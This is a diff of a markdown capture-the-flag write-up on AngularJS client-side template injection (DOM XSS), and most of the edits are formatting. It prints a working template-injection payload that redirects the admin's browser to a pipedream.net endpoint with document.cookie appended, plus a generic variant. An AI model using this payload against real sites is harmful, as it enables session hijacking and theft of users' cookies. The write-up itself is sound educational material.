@@ -30,10 +30,11 @@ The way Angular binds data into the HTML is via expressions, and AngularJS expre
 
 ### Hands on! :fire:
 
-We have this challenge, with an input that seems to be "unsafe":
+We have this challenge, with an input that seems to be "unsafe":  
 ![xss dom image 1](xssdom1.PNG)
 
 Let's see if the response source-code contains something interesting:
+
 ![xss dom image 2](xssdom2.PNG)
 
 Ahá! We can see the `ng-app` directive and inside it our string (my name in this case)
@@ -45,21 +46,21 @@ And we have succesfully injected our payload.
 It's clearly seen that this payload is seen in the query string part of the URI, so we can use this to steal the admin's cookie.
 For this purpose we will have to do 2 things:
 
-1- Adapt the payload to send the response to our desired endpoint (pipedream.net in my case, for simplicity's sake)
-2- Let the admin execute the payload (as this is a vulnerable site, it's done via the contact page :) )
+1. Adapt the payload to send the response to our desired endpoint (pipedream.net in my case, for simplicity's sake)  
+2. Let the admin execute the payload (as this is a vulnerable site, it's done via the contact page :) )
 
 In this example, I'm adapting the payload for stealing the cookie's admin like this:
 
-```
+```sh 
 $<protocol>://<domain>/contact?url=[[[[PAYLOAD]]]]
 
-The payload can be then teared down like:
+# The payload can be then teared down like:
 {{$on.constructor("href=`desired-endpoint.com?querystring=`.concat(admin.cookie)")()}}
 
-And the resulting query being:
+# And the resulting query being:
 http://vulnerable_domain.com/?url={{$on.constructor("document.location=`https://eoj1ovww5kfcgvi.m.pipedream.net?cookie=`.concat(document.cookie)")()}}"
 ```
-Aaand... there it is! 
+Aaand... there it is!  
 ![xss dom image 4](xssdom4.PNG)
 
 We have captured our :sparkles: flag! :sparkles:
